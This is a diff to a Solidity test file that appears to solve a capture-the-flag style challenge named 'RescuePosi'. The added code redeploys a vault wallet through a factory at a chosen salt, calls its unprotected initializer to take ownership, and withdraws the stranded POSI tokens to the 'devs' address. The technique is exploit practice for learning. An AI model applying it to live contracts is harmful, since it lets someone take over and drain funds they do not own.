@@ -11,6 +11,10 @@ import {PosiCoin} from "../src/4_RescuePosi/PosiCoin.sol";
 //    If you need a contract for your hack, define it below //
 ////////////////////////////////////////////////////////////*/
 
+interface IVaultWalletTemplate{
+     function withdrawERC20(address token, uint256 _amount, address destination)external;
+     function initialize(address)external;
+}
 
 
 /*////////////////////////////////////////////////////////////
@@ -48,7 +52,13 @@ contract Challenge4Test is Test {
         ////////////////////////////////////////////////////*/
 
 
+        address adr = FACTORY.deploy( type(VaultWalletTemplate).creationCode, 11);
+        console.log("Deployed address is ",adr);
+        console.log("balance is ",POSI.balanceOf(adr));
+        IVaultWalletTemplate(adr).initialize(address(whitehat));
 
+        IVaultWalletTemplate(adr).withdrawERC20(address(POSI),POSI.balanceOf(adr),whitehat);
+        POSI.transfer(devs,POSI.balanceOf(whitehat));
 
         //==================================================//
         vm.stopPrank();
